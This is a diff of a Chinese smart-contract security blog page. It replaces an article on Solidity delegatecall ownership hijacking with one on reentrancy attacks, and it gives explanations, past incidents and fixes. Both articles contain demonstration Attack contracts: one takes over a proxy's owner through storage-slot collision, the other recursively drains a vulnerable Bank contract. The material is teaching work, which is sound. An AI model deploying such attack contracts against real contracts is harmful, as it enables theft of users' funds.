@@ -19,27 +19,24 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="https://zhangk64.github.io/2023/06/11/delegatecall漏洞/"/>
+    <link rel="canonical" href="https://zhangk64.github.io/2023/08/19/重入攻击/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="call 和 delegatecall 的区别 call：调用后内置变量 msg 的值会修改为调用者，执行环境为被调用者的运行环境； delegatecall：调用后内置变量 msg 的值不会修改为调用者，但执行环境为调用者的运行环境；  call 当用户A通过合约B来call合约C的时候，执行的是合约C的函数，上下文(Context，可以理解为包含变量和状态的环境)也是合约C的：msg.send">
+        <meta name="description" content="介绍重入攻击（Reentrancy Attack）是一种常见的智能合约安全漏洞，当一个函数对另一个不受信任的合约进行外部调用时，就可能发生重入攻击。 重入攻击的本质是合约内部调用的函数未能恰当地处理合约状态的更新，攻击者利用这个漏洞，将攻击代码插入到合约执行流程中，使得攻击者可以在合约还未完成之前再次调用某个函数(如: fallback, receive)，从而让攻击者在合约中获得额外的资产或信息">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Delegatecall漏洞">
-<meta property="og:url" content="https://zhangk64.github.io/2023/06/11/Delegatecall%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:title" content="重入攻击">
+<meta property="og:url" content="https://zhangk64.github.io/2023/08/19/%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/index.html">
 <meta property="og:site_name" content="Fsociety&#39;s Blog">
-<meta property="og:description" content="call 和 delegatecall 的区别 call：调用后内置变量 msg 的值会修改为调用者，执行环境为被调用者的运行环境； delegatecall：调用后内置变量 msg 的值不会修改为调用者，但执行环境为调用者的运行环境；  call 当用户A通过合约B来call合约C的时候，执行的是合约C的函数，上下文(Context，可以理解为包含变量和状态的环境)也是合约C的：msg.send">
+<meta property="og:description" content="介绍重入攻击（Reentrancy Attack）是一种常见的智能合约安全漏洞，当一个函数对另一个不受信任的合约进行外部调用时，就可能发生重入攻击。 重入攻击的本质是合约内部调用的函数未能恰当地处理合约状态的更新，攻击者利用这个漏洞，将攻击代码插入到合约执行流程中，使得攻击者可以在合约还未完成之前再次调用某个函数(如: fallback, receive)，从而让攻击者在合约中获得额外的资产或信息">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://zhangk64.github.io/2023/06/11/Delegatecall%E6%BC%8F%E6%B4%9E/call_01.jpg">
-<meta property="og:image" content="https://zhangk64.github.io/2023/06/11/Delegatecall%E6%BC%8F%E6%B4%9E/delegatecall_01.jpg">
-<meta property="article:published_time" content="2023-06-11T11:14:38.000Z">
-<meta property="article:modified_time" content="2024-09-09T03:32:38.864Z">
+<meta property="article:published_time" content="2023-08-19T08:16:31.000Z">
+<meta property="article:modified_time" content="2024-09-11T13:58:23.970Z">
 <meta property="article:author" content="fsociety">
 <meta property="article:tag" content="Solidity">
 <meta property="article:tag" content="智能合约安全">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://zhangk64.github.io/2023/06/11/Delegatecall%E6%BC%8F%E6%B4%9E/call_01.jpg">
     
     
     <!--- Icon Part-->
@@ -51,7 +48,7 @@
     
     <title>
         
-            Delegatecall漏洞 -
+            重入攻击 -
         
         Fsociety&#39;s Blog
     </title>
@@ -313,7 +310,7 @@
         <div class="article-title relative w-full">
             
                 <div class="w-full flex items-center pt-6 justify-start">
-                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Delegatecall漏洞</h1>
+                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">重入攻击</h1>
                 </div>
             
             </div>
@@ -334,15 +331,15 @@
                         <div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2023-06-11 19:14:38</span>
-        <span class="mobile">2023-06-11 19:14:38</span>
+        <span class="desktop">2023-08-19 16:16:31</span>
+        <span class="mobile">2023-08-19 16:16:31</span>
         <span class="hover-info">创建</span>
     </span>
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-09-09 11:32:38</span>
-            <span class="mobile">2024-09-09 11:32:38</span>
+            <span class="desktop">2024-09-11 21:58:23</span>
+            <span class="mobile">2024-09-11 21:58:23</span>
             <span class="hover-info">更新</span>
         </span>
     
@@ -384,53 +381,82 @@
 
 
         <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-            <h3 id="call-和-delegatecall-的区别"><a href="#call-和-delegatecall-的区别" class="headerlink" title="call 和 delegatecall 的区别"></a>call 和 delegatecall 的区别</h3><ul>
-<li>call：调用后内置变量 msg 的值会修改为调用者，执行环境为被调用者的运行环境；</li>
-<li>delegatecall：调用后内置变量 msg 的值不会修改为调用者，但执行环境为调用者的运行环境；</li>
-</ul>
-<h4 id="call"><a href="#call" class="headerlink" title="call"></a>call</h4><img lazyload src="/images/loading.svg" data-src="/2023/06/11/Delegatecall%E6%BC%8F%E6%B4%9E/call_01.jpg" class alt="alt text">
-<p>当用户A通过合约B来call合约C的时候，执行的是合约C的函数，上下文(Context，可以理解为包含变量和状态的环境)也是合约C的：msg.sender是B的地址，并且如果函数改变一些状态变量，产生的效果会作用于合约C的变量上。</p>
-<h4 id="delegatecall"><a href="#delegatecall" class="headerlink" title="delegatecall"></a>delegatecall</h4><img lazyload src="/images/loading.svg" data-src="/2023/06/11/Delegatecall%E6%BC%8F%E6%B4%9E/delegatecall_01.jpg" class alt="alt text">
-<p>当用户A通过合约B来delegatecall合约C的时候，执行的是合约C的函数，但是上下文仍是合约B的：msg.sender是A的地址，并且如果函数改变一些状态变量，产生的效果会作用于合约B的变量上。</p>
-<p>另外，当使用 delegatecall 函数进行外部调用涉及到 storage 变量的修改时是根据插槽位置来修改的而不是变量名。如下代码：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">contract A &#123;</span><br><span class="line">    address public c;</span><br><span class="line">    address public a;</span><br><span class="line"></span><br><span class="line">    function test() public returns (address b)&#123;</span><br><span class="line">        b = address(this);</span><br><span class="line">        a = b;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract B &#123;</span><br><span class="line">    address public a;</span><br><span class="line">    address public c;</span><br><span class="line"></span><br><span class="line">    address Aaddress ;</span><br><span class="line"></span><br><span class="line">    constructor(address _Aaddress) &#123;</span><br><span class="line">        Aaddress = _Aaddress;   // 传入A合约的地址</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testDelegatecall() public&#123;</span><br><span class="line">        Aaddress.delegatecall(abi.encodeWithSignature(&quot;test()&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-<p>A 合约中 address c 存储在 slot0 中，address a 存储在 slot1 中，反之在 B 合约中 address a 存储在 slot0 中，address c 存储在 slot1 中。当我们通过调用 B 合约中的 delegatecall 函数调用 A 合约中的 test 函数时，test 函数修改的是 A 合约中 slot1 这个插槽，所以代码运行的结果是 B 合约中的 address c 被修改了，因为在 B 合约中的 slot1 对应的正是 address c 这个地址存储的位置。</p>
-<h3 id="delegatecall-漏洞"><a href="#delegatecall-漏洞" class="headerlink" title="delegatecall 漏洞"></a>delegatecall 漏洞</h3><p>也叫代理合约所有者操纵漏洞，该漏洞允许攻击者操纵代理合约的所有者（下文中B合约为代理合约）。</p>
-<p>以下代码中，可以看到有两个合约，A 合约中通过 test() 函数用来修改合约的 owner，在 B 合约中存在 fallback 函数，fallback 函数的内容是使用 delegatecall 去调用 A 合约中的函数。我们通过 Attack 合约，利用 B.fallback() 触发 delegatecall 函数去调用 A.test() 将 B 合约中的 owner 改成 Attack 合约，从而控制 B 合约。</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">contract A &#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    function test() public &#123;   // 这里方便演示漏洞效果使用public，实际中会有权限校验。</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract B &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    A public a;</span><br><span class="line"></span><br><span class="line">    constructor(A _a) &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        a = A(_a);   // 传入A合约的地址</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external  &#123;</span><br><span class="line">        address(a).delegatecall(msg.data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    address public b;</span><br><span class="line"></span><br><span class="line">    constructor(address _b) &#123;</span><br><span class="line">        b = _b;    // 传入B合约的地址</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        b.call(abi.encodeWithSignature(&quot;test()&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="delegatecall-漏洞进阶版"><a href="#delegatecall-漏洞进阶版" class="headerlink" title="delegatecall 漏洞进阶版"></a>delegatecall 漏洞进阶版</h3><p>先看代码</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">contract A &#123;</span><br><span class="line">    uint public someNumber;</span><br><span class="line"></span><br><span class="line">    function doSomething(uint _num) public &#123;</span><br><span class="line">        someNumber = _num;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract B &#123;</span><br><span class="line">    address public a;    // slot 0</span><br><span class="line">    address public owner;   // slot 1</span><br><span class="line">    uint public someNumber;</span><br><span class="line"></span><br><span class="line">    constructor(address _a) &#123;</span><br><span class="line">        a = _a;    // 传入A合约的地址</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function doSomething(uint _num) public &#123;</span><br><span class="line">        a.delegatecall(abi.encodeWithSignature(&quot;doSomething(uint256)&quot;, _num));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    address public a;    // slot 0</span><br><span class="line">    address public owner;  // slot 1</span><br><span class="line">    uint public someNumber;</span><br><span class="line"></span><br><span class="line">    B public b;</span><br><span class="line"></span><br><span class="line">    constructor(B _b) &#123;</span><br><span class="line">        b = B(_b);   // 传入B合约的地址</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        b.doSomething(uint(uint160(address(this))));   // 第一次调用替换B合约中的a地址为当前合约地址</span><br><span class="line">        b.doSomething(1);      // 第二次调用当前合约的doSomething()函数</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function doSomething(uint _num) public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-<p>攻击流程：</p>
+            <h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>重入攻击（Reentrancy Attack）是一种常见的智能合约安全漏洞，当一个函数对另一个不受信任的合约进行外部调用时，就可能发生重入攻击。</p>
+<p>重入攻击的本质是合约内部调用的函数未能恰当地处理合约状态的更新，攻击者利用这个漏洞，将攻击代码插入到合约执行流程中，使得攻击者可以在合约还未完成之前再次调用某个函数(如: fallback, receive)，从而让攻击者在合约中获得额外的资产或信息。可以认为合约中所有的外部调用都是不安全的，都有可能存在重入漏洞。</p>
+<p>重入攻击类似编程里的递归调用，发生重入攻击的条件有2个：</p>
 <ul>
-<li>用户 部署 A 合约；</li>
-<li>用户 部署 B 合约并在构造函数中传入 A 合约的地址；</li>
-<li>攻击者 部署 Attack 合约并在构造函数中传入 B 合约的地址；</li>
-<li>攻击者调用 Attack.attack() 函数将 B 合约中的 owner 变为自己。</li>
+<li>调用外部的合约且该合约是不安全的；</li>
+<li>外部合约的函数调用早于状态变量的更新；</li>
 </ul>
-<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><ul>
-<li>在使用 delegatecall 时应注意被调用合约的地址不能是可控的；</li>
-<li>在较为复杂的合约环境下需要注意变量的声明顺序以及存储位置。因为使用 delegatecall 进行外部调时会根据被调用合约的数据结构来用修改本合约相应 slot 中存储的数据，在数据结构发生变化时这可能会造成非预期的变量覆盖。</li>
+<p>著名的重入攻击事件：<br>2016 年，The DAO 合约被重入攻击，黑客盗走了合约中的 3,600,000 枚 ETH，并导致以太坊分叉为 ETH 链和 ETC（以太经典）链。<br>2019 年，合成资产平台 Synthetix 遭受重入攻击，被盗 3,700,000 枚 sETH。<br>2020 年，借贷平台 Lendf.me 遭受重入攻击，被盗 $25,000,000。<br>2021 年，借贷平台 CREAM FINANCE 遭受重入攻击，被盗 $18,800,000。<br>2022 年，算法稳定币项目 Fei 遭受重入攻击，被盗 $80,000,000。</p>
+<h3 id="漏洞示例"><a href="#漏洞示例" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><p>先介绍几个概念</p>
+<p><strong>receive函数和fallback函数</strong></p>
+<p>Solidity支持两种特殊的回调函数，receive() 和 fallback() 。(在0.6版本之后 fallback() 函数拆分成 receive() 和 fallback() 两个函数)</p>
+<p>receive函数，不能有任何的参数，不能返回任何值，不需要function关键字，必须包含external和payable，一个合约最多只有一个receive()函数。</p>
+<ul>
+<li>原型：<code>receive() external payable &#123; ... &#125;</code>;</li>
+<li>功能：接收外部转账时需要实现此函数；</li>
 </ul>
+<p>fallback函数，不需要function关键字，必须由external修饰，payable修饰符是可选的，一个合约至多含有一个fallback()函数。</p>
+<ul>
+<li>原型：<code>fallback() external [payable] &#123; ... &#125;</code>;</li>
+<li>功能：调用合约不存在的函数时触发fallback函数执行；</li>
+</ul>
+<p><strong>转账函数</strong></p>
+<ol>
+<li><p>transfer</p>
+<ul>
+<li>函数原型：<code>&lt;address payable&gt;.transfer(uint256 amount)</code>;</li>
+<li>如果函数执行异常会转账失败，抛出异常（等价于require(send()）(合约地址转账)，会回滚交易（revert);</li>
+<li>有gas限制，最大2300（对方合约的fallback或receive函数不能实现太复杂的逻辑，否则gas不够）;</li>
+</ul>
+</li>
+<li><p>send</p>
+<ul>
+<li>函数原型：<code>&lt;address payable&gt;.send(uint256 amount) returns (bool)</code>;</li>
+<li>如果函数执行异常会转账失败，仅会返回false，不会终止执行（合约地址转账）;</li>
+<li>有gas限制，最大2300（对方合约的fallback或receive函数不能实现太复杂的逻辑，否则gas不够）;</li>
+</ul>
+</li>
+<li><p>call</p>
+<ul>
+<li>函数原型：<code>&lt;address&gt;.call(bytes memory) returns (bool, bytes memory)</code>；</li>
+<li>如果函数执行异常会转账失败，金辉返回false，不会终止执行（调用合约的方法并转账）；</li>
+<li>没有gas限制（支持对方合约的fallback、receive和其它函数实现复杂的逻辑）；</li>
+</ul>
+</li>
+</ol>
+<p><strong>代码示例</strong></p>
+<p>以下代码中 Bank 合约可以进行存款和取款，Attack 合约首先存入1个ETH，然后通过 Bank 合约的 withdraw 函数进行取款，Attack 合约收款时在 fallback() 或 receive() 函数中又重新调用了 Bank 合约的 withdraw() 函数，由于 Attack 的银行余额并没有及时更新，导致可以递归循环取走 Bank 合约中的所有ETH。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">contract Bank &#123;</span><br><span class="line">    mapping (address =&gt; uint256) public balanceOf;    // 余额mapping</span><br><span class="line"></span><br><span class="line">    constructor() payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    // 存入ether，并更新余额</span><br><span class="line">    function deposit() external payable &#123;</span><br><span class="line">        balanceOf[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 提取msg.sender的全部ether</span><br><span class="line">    function withdraw() external &#123;</span><br><span class="line">        uint256 balance = balanceOf[msg.sender]; // 获取余额</span><br><span class="line">        require(balance &gt; 0, &quot;Insufficient balance&quot;);</span><br><span class="line">        // call进行转账，可能激活攻击合约的fallback/receive函数，存在重入风险</span><br><span class="line">        (bool success, ) = msg.sender.call&#123;value: balance&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Failed to send Ether&quot;);</span><br><span class="line">        // 更新余额</span><br><span class="line">        balanceOf[msg.sender] = 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 获取银行合约的余额</span><br><span class="line">    function getBalance() external view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    Bank public bank; // Bank合约地址</span><br><span class="line"></span><br><span class="line">    // 初始化Bank合约地址</span><br><span class="line">    constructor(Bank _bank) &#123;</span><br><span class="line">        bank = _bank;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 回调函数，用于重入攻击Bank合约，反复的调用目标的withdraw函数</span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        if (bank.getBalance() &gt;= 1 ether) &#123;</span><br><span class="line">            bank.withdraw();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 攻击函数，调用时 msg.value 设为 1 ether</span><br><span class="line">    function attack() external payable &#123;</span><br><span class="line">        require(msg.value == 1 ether, &quot;Require 1 Ether to attack&quot;);</span><br><span class="line">        bank.deposit&#123;value: 1 ether&#125;();</span><br><span class="line">        bank.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 获取本合约的余额</span><br><span class="line">    function getBalance() external view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 
+<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p><strong>检查-效果-交互（checks-effect-interaction）</strong></p>
+<ul>
+<li>先检查状态是否满足条件。以Bank合约为例，即 <code>require(balance &gt; 0, &quot;Insufficient balance&quot;);</code></li>
+<li>再更新状态。以Bank合约为例，即 <code>balanceOf[msg.sender] = 0;</code></li>
+<li>最后再和其它合约进行交互。以Bank合约为例，即<code>(bool success, ) = msg.sender.call&#123;value: balance&#125;(&quot;&quot;);</code></li>
+</ul>
+<p><strong>重入锁</strong></p>
+<p>重入锁是一种防止重入函数的修饰器（modifier）。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">uint8 private _status;</span><br><span class="line">modifier nonReentrant() &#123;</span><br><span class="line">    require(_status == 0, &quot;Reentrant call&quot;);</span><br><span class="line">    _status = 1;</span><br><span class="line"></span><br><span class="line">    _;</span><br><span class="line">    </span><br><span class="line">    _status = 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
         </div>
 
         
             <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
                 <div class="article-copyright-info-container">
     <ul>
-        <li><strong>标题:</strong> Delegatecall漏洞</li>
+        <li><strong>标题:</strong> 重入攻击</li>
         <li><strong>作者:</strong> fsociety</li>
         <li><strong>创建于
-                :</strong> 2023-06-11 19:14:38</li>
+                :</strong> 2023-08-19 16:16:31</li>
         
             <li>
                 <strong>更新于
-                    :</strong> 2024-09-09 11:32:38
+                    :</strong> 2024-09-11 21:58:23
             </li>
         
         <li>
-            <strong>链接:</strong> https://zhangk64.github.io/2023/06/11/Delegatecall漏洞/
+            <strong>链接:</strong> https://zhangk64.github.io/2023/08/19/重入攻击/
         </li>
         <li>
             <strong>
@@ -470,18 +496,33 @@
                     <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                         <a class="prev"
                         rel="prev"
-                        href="/2023/06/24/%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%94%BB%E5%87%BB/"
+                        href="/2024/04/13/GAS%E4%BC%98%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89/"
                         >
                             <span class="left arrow-icon flex justify-center items-center">
                                 <i class="fa-solid fa-chevron-left"></i>
                             </span>
                             <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">随机数攻击</span>
+                                <span class="post-nav-title-item">Gas优化（一）</span>
                                 <span class="post-nav-item">上一篇</span>
                             </span>
                         </a>
                     </div>
                 
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2023/07/15/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">整型溢出</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
                 
             </div>
         
@@ -553,8 +594,8 @@
             <div class="post-toc-wrap">
     <div class="post-toc">
         <div class="toc-title">目录</div>
-        <div class="page-title">Delegatecall漏洞</div>
-        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#call-%E5%92%8C-delegatecall-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-text">call 和 delegatecall 的区别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#delegatecall-%E6%BC%8F%E6%B4%9E"><span class="nav-text">delegatecall 漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#delegatecall-%E6%BC%8F%E6%B4%9E%E8%BF%9B%E9%98%B6%E7%89%88"><span class="nav-text">delegatecall 漏洞进阶版</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="nav-text">修复建议</span></a></li></ol>
+        <div class="page-title">重入攻击</div>
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%8B%E7%BB%8D"><span class="nav-text">介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%A4%BA%E4%BE%8B"><span class="nav-text">漏洞示例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="nav-text">修复建议</span></a></li></ol>
 
     </div>
 </div>
